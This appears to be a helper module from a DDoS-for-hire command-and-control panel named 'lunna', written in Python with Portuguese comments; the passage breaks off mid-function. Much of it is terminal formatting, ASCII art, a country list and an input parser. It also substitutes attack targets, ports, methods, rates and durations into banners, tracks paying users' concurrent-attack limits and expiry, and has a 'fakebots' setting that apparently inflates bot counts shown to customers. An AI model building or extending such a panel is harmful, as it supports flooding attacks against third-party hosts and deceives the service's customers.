import socket, json, time, re
from src.env import env
from src.database import users, attacks
from datetime import datetime


spinner        = ['-', '\\', '|', '/']
clear = lambda sock: sock.send('\033c'.encode())
settitle = lambda sock, title: sock.send(f'\033]0;{title}\a'.encode())
def lnb(start, end):return list(range(start, end-1))
def log(user, data):
    if 'debug' not in user.lower():
        with open('lunna.logs', 'a') as log:
            log.write(f'[ {datetime.now().strftime("%d/%m/%Y %H:%M:%S")} ] {user} > {data}\n')
    else:
        with open('crash.logs', 'a') as log:
            log.write(f'[ {datetime.now().strftime("%d/%m/%Y %H:%M:%S")} ] {user} > {data}\n')
def has_special_characters(username):
    """
    Verifica se o nome de usuário contém caracteres especiais.
    
    Args:
        username (str): Nome de usuário a ser verificado
    
    Returns:
        bool: True se contém caracteres especiais, False caso contrário
    """
    pattern = r'^[a-zA-Z0-9_]+$'
    
    if re.match(pattern, username):
        return False
    else:
        return True
COUNTRIES = [
    ("AD", "Andorra"),
    ("AE", "United Arab Emirates"),
    ("AF", "Afghanistan"),
    ("AG", "Antigua and Barbuda"),
    ("AI", "Anguilla"),
    ("AL", "Albania"),
    ("AM", "Armenia"),
    ("AO", "Angola"),
    ("AQ", "Antarctica"),
    ("AR", "Argentina"),
    ("AS", "American Samoa"),
    ("AT", "Austria"),
    ("AU", "Australia"),
    ("AW", "Aruba"),
    ("AX", "Åland Islands"),
    ("AZ", "Azerbaijan"),
    ("BA", "Bosnia and Herzegovina"),
    ("BB", "Barbados"),
    ("BD", "Bangladesh"),
    ("BE", "Belgium"),
    ("BF", "Burkina Faso"),
    ("BG", "Bulgaria"),
    ("BH", "Bahrain"),
    ("BI", "Burundi"),
    ("BJ", "Benin"),
    ("BL", "Saint Barthélemy"),
    ("BM", "Bermuda"),
    ("BN", "Brunei"),
    ("BO", "Bolivia"),
    ("BQ", "Caribbean Netherlands"),
    ("BR", "Brazil"),
    ("BS", "Bahamas"),
    ("BT", "Bhutan"),
    ("BV", "Bouvet Island"),
    ("BW", "Botswana"),
    ("BY", "Belarus"),
    ("BZ", "Belize"),
    ("CA", "Canada"),
    ("CC", "Cocos (Keeling) Islands"),
    ("CD", "DR Congo"),
    ("CF", "Central African Republic"),
    ("CG", "Congo"),
    ("CH", "Switzerland"),
    ("CI", "Côte d'Ivoire"),
    ("CK", "Cook Islands"),
    ("CL", "Chile"),
    ("CM", "Cameroon"),
    ("CN", "China"),
    ("CO", "Colombia"),
    ("CR", "Costa Rica"),
    ("CU", "Cuba"),
    ("CV", "Cabo Verde"),
    ("CW", "Curaçao"),
    ("CX", "Christmas Island"),
    ("CY", "Cyprus"),
    ("CZ", "Czechia"),
    ("DE", "Germany"),
    ("DJ", "Djibouti"),
    ("DK", "Denmark"),
    ("DM", "Dominica"),
    ("DO", "Dominican Republic"),
    ("DZ", "Algeria"),
    ("EC", "Ecuador"),
    ("EE", "Estonia"),
    ("EG", "Egypt"),
    ("EH", "Western Sahara"),
    ("ER", "Eritrea"),
    ("ES", "Spain"),
    ("ET", "Ethiopia"),
    ("FI", "Finland"),
    ("FJ", "Fiji"),
    ("FK", "Falkland Islands"),
    ("FM", "Micronesia"),
    ("FO", "Faroe Islands"),
    ("FR", "France"),
    ("GA", "Gabon"),
    ("GB", "United Kingdom"),
    ("GD", "Grenada"),
    ("GE", "Georgia"),
    ("GF", "French Guiana"),
    ("GG", "Guernsey"),
    ("GH", "Ghana"),
    ("GI", "Gibraltar"),
    ("GL", "Greenland"),
    ("GM", "Gambia"),
    ("GN", "Guinea"),
    ("GP", "Guadeloupe"),
    ("GQ", "Equatorial Guinea"),
    ("GR", "Greece"),
    ("GS", "South Georgia and South Sandwich Islands"),
    ("GT", "Guatemala"),
    ("GU", "Guam"),
    ("GW", "Guinea-Bissau"),
    ("GY", "Guyana"),
    ("HK", "Hong Kong"),
    ("HM", "Heard Island and McDonald Islands"),
    ("HN", "Honduras"),
    ("HR", "Croatia"),
    ("HT", "Haiti"),
    ("HU", "Hungary"),
    ("ID", "Indonesia"),
    ("IE", "Ireland"),
    ("IL", "Israel"),
    ("IM", "Isle of Man"),
    ("IN", "India"),
    ("IO", "British Indian Ocean Territory"),
    ("IQ", "Iraq"),
    ("IR", "Iran"),
    ("IS", "Iceland"),
    ("IT", "Italy"),
    ("JE", "Jersey"),
    ("JM", "Jamaica"),
    ("JO", "Jordan"),
    ("JP", "Japan"),
    ("KE", "Kenya"),
    ("KG", "Kyrgyzstan"),
    ("KH", "Cambodia"),
    ("KI", "Kiribati"),
    ("KM", "Comoros"),
    ("KN", "Saint Kitts and Nevis"),
    ("KP", "North Korea"),
    ("KR", "South Korea"),
    ("KW", "Kuwait"),
    ("KY", "Cayman Islands"),
    ("KZ", "Kazakhstan"),
    ("LA", "Laos"),
    ("LB", "Lebanon"),
    ("LC", "Saint Lucia"),
    ("LI", "Liechtenstein"),
    ("LK", "Sri Lanka"),
    ("LR", "Liberia"),
    ("LS", "Lesotho"),
    ("LT", "Lithuania"),
    ("LU", "Luxembourg"),
    ("LV", "Latvia"),
    ("LY", "Libya"),
    ("MA", "Morocco"),
    ("MC", "Monaco"),
    ("MD", "Moldova"),
    ("ME", "Montenegro"),
    ("MF", "Saint Martin"),
    ("MG", "Madagascar"),
    ("MH", "Marshall Islands"),
    ("MK", "North Macedonia"),
    ("ML", "Mali"),
    ("MM", "Myanmar"),
    ("MN", "Mongolia"),
    ("MO", "Macao"),
    ("MP", "Northern Mariana Islands"),
    ("MQ", "Martinique"),
    ("MR", "Mauritania"),
    ("MS", "Montserrat"),
    ("MT", "Malta"),
    ("MU", "Mauritius"),
    ("MV", "Maldives"),
    ("MW", "Malawi"),
    ("MX", "Mexico"),
    ("MY", "Malaysia"),
    ("MZ", "Mozambique"),
    ("NA", "Namibia"),
    ("NC", "New Caledonia"),
    ("NE", "Niger"),
    ("NF", "Norfolk Island"),
    ("NG", "Nigeria"),
    ("NI", "Nicaragua"),
    ("NL", "Netherlands"),
    ("NO", "Norway"),
    ("NP", "Nepal"),
    ("NR", "Nauru"),
    ("NU", "Niue"),
    ("NZ", "New Zealand"),
    ("OM", "Oman"),
    ("PA", "Panama"),
    ("PE", "Peru"),
    ("PF", "French Polynesia"),
    ("PG", "Papua New Guinea"),
    ("PH", "Philippines"),
    ("PK", "Pakistan"),
    ("PL", "Poland"),
    ("PM", "Saint Pierre and Miquelon"),
    ("PN", "Pitcairn"),
    ("PR", "Puerto Rico"),
    ("PS", "Palestine"),
    ("PT", "Portugal"),
    ("PW", "Palau"),
    ("PY", "Paraguay"),
    ("QA", "Qatar"),
    ("RE", "Réunion"),
    ("RO", "Romania"),
    ("RS", "Serbia"),
    ("RU", "Russia"),
    ("RW", "Rwanda"),
    ("SA", "Saudi Arabia"),
    ("SB", "Solomon Islands"),
    ("SC", "Seychelles"),
    ("SD", "Sudan"),
    ("SE", "Sweden"),
    ("SG", "Singapore"),
    ("SH", "Saint Helena, Ascension and Tristan da Cunha"),
    ("SI", "Slovenia"),
    ("SJ", "Svalbard and Jan Mayen"),
    ("SK", "Slovakia"),
    ("SL", "Sierra Leone"),
    ("SM", "San Marino"),
    ("SN", "Senegal"),
    ("SO", "Somalia"),
    ("SR", "Suriname"),
    ("SS", "South Sudan"),
    ("ST", "São Tomé and Príncipe"),
    ("SV", "El Salvador"),
    ("SX", "Sint Maarten"),
    ("SY", "Syria"),
    ("SZ", "Eswatini"),
    ("TC", "Turks and Caicos Islands"),
    ("TD", "Chad"),
    ("TF", "French Southern Territories"),
    ("TG", "Togo"),
    ("TH", "Thailand"),
    ("TJ", "Tajikistan"),
    ("TK", "Tokelau"),
    ("TL", "Timor-Leste"),
    ("TM", "Turkmenistan"),
    ("TN", "Tunisia"),
    ("TO", "Tonga"),
    ("TR", "Türkiye"),
    ("TT", "Trinidad and Tobago"),
    ("TV", "Tuvalu"),
    ("TW", "Taiwan"),
    ("TZ", "Tanzania"),
    ("UA", "Ukraine"),
    ("UG", "Uganda"),
    ("UM", "US Minor Outlying Islands"),
    ("US", "United States"),
    ("UY", "Uruguay"),
    ("UZ", "Uzbekistan"),
    ("VA", "Vatican City"),
    ("VC", "Saint Vincent and the Grenadines"),
    ("VE", "Venezuela"),
    ("VG", "British Virgin Islands"),
    ("VI", "US Virgin Islands"),
    ("VN", "Vietnam"),
    ("VU", "Vanuatu"),
    ("WF", "Wallis and Futuna"),
    ("WS", "Samoa"),
    ("YE", "Yemen"),
    ("YT", "Mayotte"),
    ("ZA", "South Africa"),
    ("ZM", "Zambia"),
    ("ZW", "Zimbabwe"),
]
capimages      = {
 'bus':["""
 .-------------------------------------------------------------.
'------..-------------..----------..----------..----------..--.|
|       \\\\            ||          ||          ||          ||  ||
|        \\\\           ||          ||          ||          ||  ||
|    ..   ||  _    _  ||    _   _ || _    _   ||    _    _||  ||
|    ||   || //   //  ||   //  // ||//   //   ||   //   //|| /||
|_.------"''----------''----------''----------''----------''--'|
|)|      |       |       |       |    |         |      ||==|   |
| |      |  _-_  |       |       |    |  .-.    |      ||==|  C|
| |  __  |.'.-.' |   _   |   _   |    |.'.-.'.  |  __  |  \"__=='
'---------'|( )|'----------------------'|( )|'-----------\"\"
""",
"""
                          __
 .-----------------------'  |
/| _ .---. .---. .---. .---.|
|j||||___| |___| |___| |___||
|=|||=======================|
[_|j||(O)\\__________|(O)\\___] 
"""],
 'computer':["""
           __________                                 
         .'----------`.                              
         | .--------. |                             
         | |########| |       __________              
         | |########| |      /__________\\             
.--------| `--------' |------|    --=-- |-------------.
|        `----,-.-----'      |o ======  |             | 
|       ______|_|_______     |__________|             | 
|      /  %%%%%%%%%%%%  \\                             | 
|     /  %%%%%%%%%%%%%%  \\                            | 
|     ^^^^^^^^^^^^^^^^^^^^                            | 
+-----------------------------------------------------+
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 
""",
"""
 ___________________
 | _______________ |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 | |XXXXXXXXXXXXX| |
 |_________________|
     _[_______]_
 ___[___________]___
|         [_____] []|__
|         [_____] []|  \\__
L___________________J     \\ \\___\\/
 ___________________      /\
/###################\\    (__)
""",
"""
                         ______                     
 _________        .---"""      """---.              
:______.-':      :  .--------------.  :             
| ______  |      | :                : |             
|:______B:|      | |                | |             
|:______B:|      | |                | |             
|:______B:|      | |                | |             
|         |      | |                | |             
|:_____:  |      | |                | |             
|    ==   |      | :                : |             
|       O |      :  '--------------'  :             
|       o |      :'---...______...---'              
|       o |-._.-i___/'             \\._              
|'-.____o_|   '-.   '-...______...-'  `-._          
:_________:      `.____________________   `-.___.-. 
                 .'.eeeeeeeeeeeeeeeeee.'.      :___:
               .'.eeeeeeeeeeeeeeeeeeeeee.'.         
              :____________________________:
"""],
 'apple':["""
           .:'
      __ :'__
   .'`__`-'__``.
  :__________.-'
  :_________:
   :_________`-;
    `.__.-.__.'
""","""
                        .8 
                      .888
                    .8888'
                   .8888'
                   888'
                   8'
      .88888888888. .88888888888.
   .8888888888888888888888888888888.
 .8888888888888888888888888888888888.
.&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&'
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&'
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&'
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.
`%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.
 `00000000000000000000000000000000000'
  `000000000000000000000000000000000'
   `0000000000000000000000000000000'
     `###########################'
      `#######################'
         `#########''########'
           `\"\"\"\"\"\"'  `\"\"\"\"\"'
"""],
 'controller':["""
       _=====_                               _=====_
     / _____ \\                             / _____ \\
   +.-'_____'-.---------------------------.-'_____'-.+
  /   |     |  '.        S O N Y        .'  |  _  |   \\
 / ___| /|\\ |___ \\                     / ___| /_\\ |___ \\
/ |      |      | ;  __           _   ; | _         _ | ;
| | <---   ---> | | |__|         |_:> | ||_|       (_)| |
| |___   |   ___| ;SELECT       START ; |___       ___| ;
|\\    | \\|/ |    /  _     ___      _   \\    | (X) |    /|
| \\   |_____|  .','" "', |___|  ,'" "', '.  |_____|  .' |
|  '-.______.-' /       \\ANALOG/       \\  '-._____.-'   |
|               |       |------|       |                |
|              /\\       /      \\       /\\               |
|             /  '.___.'        '.___.'  \\              |
|            /                            \\             |
 \\          /                              \\           /
  \\________/                                \\_________/"""]}
class c:
    # reset
    R = '\033[0m'
    # Cores básicas
    BLACK = '\033[30m'
    RED = '\033[38;2;255;0;0m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[38;2;93;43;255m'
    CYAN = '\033[36m'
    WHITE = '\033[38;2;255;255;255m'
    # Cores brilhantes
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    # Cores brilhantes
    DARK_RED = '\033[38;2;130;0;0m'
    DARK_GREEN = '\033[38;2;0;130;0m'
    DARK_YELLOW = '\033[38;2;100;100;0m'
    DARK_BLUE = '\033[38;2;0;0;130m'
    DARK_MAGENTA = '\033[38;2;130;0;190m'
    DARK_CYAN = '\033[38;2;0;85;100m'
    DARK_WHITE = '\033[38;2;130;130;130m'
    # Fundo
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[48;2;255;255;255m'
    # Formatação adicional
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    # bools
    true    =f'{BG_GREEN+ BLACK}   {R}'
    false   =f'{BG_RED+   BLACK}   {R}'
def findbyuser(user):
        for session in list(env['users']['clients'].keys()):
            if env['users']['clients'][session]['user'] == user:
                return env['users']['clients'][session]
        return False
def simplebox(text, padding=1, char="#"):
    lines = text.splitlines()
    width = max(len(line) for line in lines) + (padding * 2)
    border = char * (width + 2)
    result = [border]
    for line in lines:
        placeholders = {
        'enable': f"{c.GREEN}enable{c.R}",
        'disable': f"{c.RED}disable{c.R}",
        'expired': f"{c.RED}expired{c.R}",
        'active': f"{c.GREEN}active{c.R}"
        }
        for key, value in placeholders.items():
            line = line.replace(key, value)
        result.append(
            f"{char}{' ' * padding}{line.ljust(width - padding * 2)}{' ' * padding}{char}"
        )

    result.append(border)

    return "\n".join(result) + "\n"
def load_json(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)

    except Exception as e:
        raise RuntimeError(
            f"Failed loading {path}: {e}"
        )
def send(sock, data):
        try:
            if isinstance(data, str):
                data = data.replace('\n','\r\n').encode()
            sock.sendall(data)
        except (
            AttributeError
            ):
            pass
        except Exception as e:
            log(
                "System",
                f"send crashed: {e}"
                )
def gettimeinto(start=None, finish=None) -> str:
    if finish == None:
        finish = time.time()
    if start == None:
        start = time.time()
    seconds            = int(start)-int(finish)
    past               = False
    seconds_per_minute = 60
    seconds_per_hour   = 60 * seconds_per_minute
    seconds_per_day    = 24 * seconds_per_hour
    seconds_per_month  = 31 * seconds_per_hour
    seconds_per_year   = 12 * seconds_per_month
    seconds_per_decade = 10 * seconds_per_year
    if seconds < 0:
        seconds = -seconds
        past = True
    if seconds >= seconds_per_decade:
        metter = seconds // seconds_per_decade
        return f"{metter} decade{'s' if metter > 1 else ''}{' ago' if past else ''}"
    elif seconds >= seconds_per_year:
        metter = seconds // seconds_per_year
        return f"{metter} year{'s' if metter > 1 else ''}{' ago' if past else ''}"
    elif seconds >= seconds_per_month:
        metter = seconds // seconds_per_month
        return f"{metter} month{'s' if metter > 1 else ''}{' ago' if past else ''}"
    elif seconds >= seconds_per_day:
        metter = seconds // seconds_per_day
        return f"{metter} day{'s' if metter > 1 else ''}{' ago' if past else ''}"
    elif seconds >= seconds_per_hour:
        metter = seconds // seconds_per_hour
        return f"{metter} hour{'s' if metter > 1 else ''}{' ago' if past else ''}"
    elif seconds >= seconds_per_minute:
        metter = seconds // seconds_per_minute
        return f"{metter} minute{'s' if metter > 1 else ''}{' ago' if past else ''}"
    elif seconds >= 0 and seconds <= 59:
        return f"{seconds} second{'s' if seconds > 1 else ''}{' ago' if past else ''}"
def banners(name):
    if not name:
        return env['core']['errors'].get('404', 'Not found')
    try:
        with open(f'Banners/{name}', 'r', encoding='utf-8') as arquivo:
            return arquivo.read()
    except:
        return env['core']['errors'].get('404', 'Not found')
def process(data, sock=None, is_attack=False,is_title=False, addbreak=False):
    if sock:
        user = env['users']['clients'][sock]
        socked_placeholders = {


            # user type


            '<&user.name>': user['user'],
            '<&user.uptime>': gettimeinto(finish=user['uptime']),
            '<&user.concurrents>': str(user['concurrents']),
            '<&user.boottime>': str(user['boottime']),
            '<&user.vip>': str(user['vip']),
            '<&user.until_expiry>': gettimeinto(user['expiry']
            ),
            '<&user.createdby>': user['created_by'],
            '<&user.running>': str(
                attacks.count(user["user"], running_only=True)
            ),
            '<&users.count>': str(
                len(env['users']['clients'])
            ),


            # cnc type


            '<&cnc.uptime>': gettimeinto(
                finish=env['cnc']['uptime']
            ),
            '<&cnc.name>': env['cnc']['name'],
            '<&cnc.running>': str(
                attacks.count(running_only=True)
            ),
            '<&cnc.globalconcurrents>': str(
                env['funnel']['maximum_concurrents_on_cnc']
            ),
            }
        for key, value in socked_placeholders.items():
            data = data.replace(key, value)
    placeholders = {
            '<%color.magenta>': c.MAGENTA,
            '<%color.reset>': c.R,
            '<%color.yellow>': c.YELLOW,
            '<%color.black>': c.BLACK,
            '<%color.white>': c.WHITE,
            '<%color.cyan>': c.CYAN,
            '<%color.red>': c.RED,
            '<%color.blue>': c.BLUE,
            '<%color.green>': c.GREEN,

            '<%color.bright.red>': c.BRIGHT_RED,
            '<%color.bright.blue>': c.BRIGHT_BLUE,
            '<%color.bright.green>': c.BRIGHT_GREEN,
            '<%color.bright.magenta>': c.BRIGHT_MAGENTA,
            '<%color.bright.yellow>': c.BRIGHT_YELLOW,
            '<%color.bright.cyan>': c.BRIGHT_CYAN,

            '<%color.bg.white>': c.BG_WHITE,
            '<%color.bg.red>': c.BG_RED,
            '<%color.bg.green>': c.BG_GREEN,
            '<%color.bg.blue>': c.BG_BLUE,
            '<%color.bg.black>': c.BG_BLACK,
            '<%color.bg.magenta>': c.BG_MAGENTA,
            '<%color.bg.yellow>': c.BG_YELLOW,
            '<%color.bg.cyan>': c.BG_CYAN,

            '&x1b': '\x1b',
            '<%clear>': '\x1bc'
        }
    for key, value in placeholders.items():
        data = data.replace(key, value)
    if is_attack:
        attack_placeholders = {
                '{LEN}': str(is_attack.get('length')),
                '{GEO}': str(is_attack.get('geolocation')),
                '{RPS}': str(is_attack.get('rps')),
                '{PORT}': str(is_attack.get('port')),
                '{HOST}': str(is_attack.get('host')),
                '{TIME}': str(is_attack.get('duration')),
                '{METHOD}': str(is_attack.get('method')),
                '{TARGET}': str(is_attack.get('host')),
                '{CONCURRENTS}': str(is_attack.get('concurrents'))
        }
        for key, value in attack_placeholders.items():
            data = data.replace(key, value)

    if '<&spinner>' in data and is_title:
        return [
            data.replace(
                '<&spinner>',
                frame
            )
            for frame in spinner
        ]
    if addbreak and not data.endswith('\n'):
        data += '\n'
    return data
def reload(sock=False, user=None):
    try:
        if user: log('Reloading', f"{user} reloaded the CNC")
        send(sock, f" [{c.CYAN}Info{c.R}] Reloading...\r\n")

        config = load_json(
            "Settings/config.json"
        )

        funnel = load_json(
            "Settings/funnel.json"
        )
        commands = load_json(
            "Settings/commands.json"
        )
        blacklist = load_json(
            "Settings/blacklist.json"
        )

        try:
            with open(
                "Banners/cmd_line.tfx",
                "r",
                encoding="utf-8"
            ) as f:
                cmd = f.read()

        except Exception:

            cmd = "[<&user.name>@<&name>]: ~$ "

            send(sock, 
                f" [{c.RED}Error{c.R}] Invalid banner file\r\n"
            )


        env["cnc"]["command-line"] = cmd

        # cnc port

        env["cnc"]["port"] = config["cnc"]["port"]

        # ongoing header color

        env["cnc"]["ongoing_color"] = config["cnc"].get("ongoing_color", '')

        # MOTD

        old = env["cnc"]["MOTD"]
        new = config["cnc"]["MOTD"]

        if old != new:

            print(
                f"[{c.YELLOW}Info{c.R}] "
                f"CNC motd changed: {new}"
            )

            send(sock, 
                f" [{c.GREEN}OK{c.R}] "
                f"MOTD changed to {new}\r\n"
            )


        env["cnc"]["MOTD"] = new



        # NAME

        old = env["cnc"]["name"]
        new = config["cnc"]["name"]


        if old != new:

            print(
                f"[{c.YELLOW}Info{c.R}] "
                f"CNC name changed: {new}"
            )


        env["cnc"]["name"] = new

        # Rate limit

        old = env["cnc"]["rate-limit-mc"]
        new = config["cnc"]["minimun_time_between_commands"]


        if old != new:

            print(
                f"[{c.YELLOW}Info{c.R}] "
                f"CNC rate limit changed: {str(new)}"
            )


        env["cnc"]["rate-limit-mc"] = new



        # SECURITY

        level = config['cnc'].get(
            "security_level",
            0
        )


        if not isinstance(level, int) or not 0 <= level <= 4:

            print(
                f"[{c.RED}Warn{c.R}] "
                "Invalid security level"
            )

            level = 0


        env["core"]["security-level"] = level



        # METHODS

        env["funnel"]           = funnel

        # commands

        commands                = commands.get(
            "commands",
            {}
        )
        aliases = {}
        for name, x in commands.items():
            alias = x.get('alias')
            if alias:
                for i in alias:
                    aliases[i]  = name

        env["cnc"]["commands"]  = commands
        env["cnc"]["aliases"]   = aliases

        # super users

        env["users"]["roots"]   = config.get(
            "superusers",
            []
        )

        # blacklists

        env["blacklist"]        = blacklist.get(
            "blacklist",
            []
        )

        #fakebots

        env["cnc"]["fakebots"]  = config.get(
            "fakebots",
            {}
        )

        #default_banners

        env["cnc"]["default_banners"] = config["cnc"]["default_banners"]

        #errors

        env["core"]["errors"]  = config.get(
            'errors',
            {
                "403": "Permission denied",
                "404": "Banner not found",
                "500": "Something not worked..."
            }
        )

        # - - - - - - - -

        send(sock, 
            f" [{c.GREEN}OK{c.R}] "
            "Configuration loaded\r\n"
        )

        env["cnc"]["default_banners"] = config['cnc'].get(
            "default_banners",
            []
        )

        print(
            f"[{c.YELLOW}Info{c.R}] "
            "Configuration reload complete."
        )
    except Exception as e:
        print(
            f"[{c.BG_RED+c.WHITE}FATAL{c.R}] "
            f"Config error: {e}"
        )
        log('System', f'Error loading Config & Funnel files: {e}')
        raise
def asciitable(data):
    if not data:
        return ""

    ansi = re.compile(r"\033\[[0-9;]*m")
    columns = list(data[0].keys())

    def clean(value):
        return ansi.sub("", str(value))

    widths = {
        c: max(
            len(clean(c)),
            *(len(clean(row.get(c, ""))) for row in data)
        )
        for c in columns
    }

    top = "┌" + "┬".join("─" * (widths[c] + 2) for c in columns) + "┐"
    mid = "├" + "┼".join("─" * (widths[c] + 2) for c in columns) + "┤"
    bot = "└" + "┴".join("─" * (widths[c] + 2) for c in columns) + "┘"

    header = "│ " + " │ ".join(
        process(env["cnc"]["ongoing_color"]) + str(c) + "\033[0m" +
        " " * (widths[c] - len(clean(c)))
        for c in columns
    ) + " │"

    rows = []

    for row in data:
        rows.append(
            "│ " + " │ ".join(
                str(row.get(c, "")) +
                " " * (
                    widths[c] -
                    len(clean(row.get(c, "")))
                )
                for c in columns
            ) + " │"
        )

    return "\n".join([
        top,
        header,
        mid,
        *rows,
        bot
    ]) + "\n"
def receive(
        sock,
        lenght=1024,
        user=False,
        debug=False,
        returnset=False,
        limitc=False,
        justnumbers=False
):
    """
    Recebe entrada interativa de um socket.

    Caracteres normais:
        - ASCII imprimível
        - UTF-8 imprimível

    Teclas especiais:
        - Enter
        - Backspace
        - Left
        - Right
        - Up
        - Down

    A entrada usa whitelist:
        tudo é rejeitado por padrão, exceto o que o parser reconhecer.

    TCP-safe:
        sequências ANSI podem chegar fragmentadas entre vários recv().
    """

    # ============================================================
    # CONSTANTES
    # ============================================================

    KEY_ENTER = "enter"
    KEY_BACKSPACE = "backspace"
    KEY_LEFT = "left"
    KEY_RIGHT = "right"
    KEY_UP = "up"
    KEY_DOWN = "down"

    ANSI_KEYS = {
        b"\x1b[D": KEY_LEFT,
        b"\x1b[C": KEY_RIGHT,
        b"\x1b[A": KEY_UP,
        b"\x1b[B": KEY_DOWN,

        # Home / End
        b"\x1b[H": "home",
        b"\x1b[F": "end",

        # Delete
        b"\x1b[3~": "delete",

        # Function keys
        b"\x1b[11~": "f1",
        b"\x1b[12~": "f2",
        b"\x1b[13~": "f3",
        b"\x1b[14~": "f4",
        b"\x1b[15~": "f5",
        b"\x1b[17~": "f6",
        b"\x1b[18~": "f7",
        b"\x1b[19~": "f8",
        b"\x1b[20~": "f9",
        b"\x1b[21~": "f10",
        b"\x1b[23~": "f11",
        b"\x1b[24~": "f12",
    }

    NUMBER_BYTES = set(b"0123456789")

    # ============================================================
    # ESTADO
    # ============================================================

    caracteres = []
    cursor = 0
    lcmd = 0

    limit = (limitc + 1) if limitc else lenght

    # Buffer persistente para sequências ANSI fragmentadas.
    buffer = bytearray()

    # ============================================================
    # HELPERS
    # ============================================================

    def debug_log(message):
        if debug:
            print(f"[receive] {message}")

    def send_echo(data):
        """
        Mantém o comportamento antigo de echo.
        """

        if returnset is False:

            if data == KEY_ENTER:
                send(sock, "\n")

            elif data == KEY_BACKSPACE:
                send(sock, b"\b \b")

            elif isinstance(data, str):
                send(sock, data)

            else:
                send(sock, data)

            return

        if isinstance(data, str):
            if data == "\r":
                send(sock, "\n")
            elif data:
                send(
                    sock,
                    returnset.replace("%c", data)
                )

    def clear_line():
        """
        Remove visualmente os caracteres antes do cursor.
        """

        nonlocal cursor

        for _ in range(cursor):
            send(sock, b"\b \b")

    def get_history():
        if not user:
            return []

        return env["users"]["user-command-history"].get(user, [])

    def history_to_text(entry):
        """
        Converte uma entrada do histórico para texto.
        """

        if not isinstance(entry, dict):
            return ""

        cmd = str(entry.get("cmd", ""))
        args = entry.get("args", [])

        if not isinstance(args, (list, tuple)):
            args = []

        args = [str(arg) for arg in args]

        if args:
            return f"{cmd} {' '.join(args)}"

        return cmd

    # ============================================================
    # PARSER
    # ============================================================

    def parse_input():
        """
        Extrai UMA unidade lógica do buffer.

        Retorna:

            ("key", KEY_LEFT)
            ("key", KEY_ENTER)
            ("text", "abc")
            ("reject", bytes)
            (None, None)

        Importante:
            não assume que recv() recebeu uma sequência ANSI inteira.
        """

        nonlocal buffer

        if not buffer:
            return None, None

        # --------------------------------------------------------
        # Enter
        # --------------------------------------------------------

        if buffer[0] == 0x0D:
            del buffer[0]
            return "key", KEY_ENTER

        if buffer[0] == 0x0A:
            del buffer[0]
            return "key", KEY_ENTER

        # --------------------------------------------------------
        # Backspace
        # --------------------------------------------------------

        if buffer[0] in (0x08, 0x7F):
            del buffer[0]
            return "key", KEY_BACKSPACE

        # --------------------------------------------------------
        # ANSI
        # --------------------------------------------------------

        if buffer[0] == 0x1B:

            # Precisamos esperar mais bytes para descobrir
            # se é uma sequência ANSI.
            if len(buffer) < 2:
                return None, None

            # Tenta encontrar uma sequência conhecida.
            for sequence, key in ANSI_KEYS.items():

                if buffer.startswith(sequence):
                    del buffer[:len(sequence)]
                    return "key", key

                # Ainda pode estar incompleta.
                if sequence.startswith(bytes(buffer)):
                    return None, None

            # ESC sozinho não é aceito.
            del buffer[0]

            return "reject", b"\x1b"

        # --------------------------------------------------------
        # ASCII
        # --------------------------------------------------------

        byte = buffer[0]

        if 32 <= byte <= 126:

            del buffer[0]

            char = chr(byte)

            if justnumbers:
                if byte in NUMBER_BYTES:
                    return "text", char

                return "reject", bytes([byte])

            return "text", char

        # --------------------------------------------------------
        # UTF-8
        # --------------------------------------------------------

        # Descobrimos quantos bytes o caractere UTF-8 deveria ter.
        if byte < 0x80:
            utf8_len = 1

        elif 0xC2 <= byte <= 0xDF:
            utf8_len = 2

        elif 0xE0 <= byte <= 0xEF:
            utf8_len = 3

        elif 0xF0 <= byte <= 0xF4:
            utf8_len = 4

        else:
            del buffer[0]
            return "reject", bytes([byte])

        # Ainda não recebemos o caractere inteiro.
        if len(buffer) < utf8_len:
            return None, None

        candidate = bytes(buffer[:utf8_len])

        try:
            char = candidate.decode("utf-8")

        except UnicodeDecodeError:
            del buffer[0]
            return "reject", bytes([byte])

        # Apenas caracteres imprimíveis.
        if not char.isprintable():
            del buffer[:utf8_len]
            return "reject", candidate

        del buffer[:utf8_len]

        if justnumbers:
            return "reject", candidate

        return "text", char

    # ============================================================
    # PROCESSAMENTO DE TECLAS
    # ============================================================

    def process_key(key):
        """
        Processa uma tecla lógica.

        Retorna True se deve haver echo.
        """

        nonlocal cursor
        nonlocal lcmd
        nonlocal caracteres

        # --------------------------------------------------------
        # ENTER
        # --------------------------------------------------------

        if key == KEY_ENTER:
            caracteres.append("\r")
            return True

        # --------------------------------------------------------
        # BACKSPACE
        # --------------------------------------------------------

        if key == KEY_BACKSPACE:

            if cursor > 0 and cursor <= len(caracteres):

                caracteres.pop(cursor - 1)
                cursor -= 1

                return True

            return False

        # --------------------------------------------------------
        # LEFT
        # --------------------------------------------------------

        if key == KEY_LEFT:

            if cursor > 0:
                cursor -= 1
                return False

            return False

        # --------------------------------------------------------
        # RIGHT
        # --------------------------------------------------------

        if key == KEY_RIGHT:

            if cursor < len(caracteres):
                cursor += 1

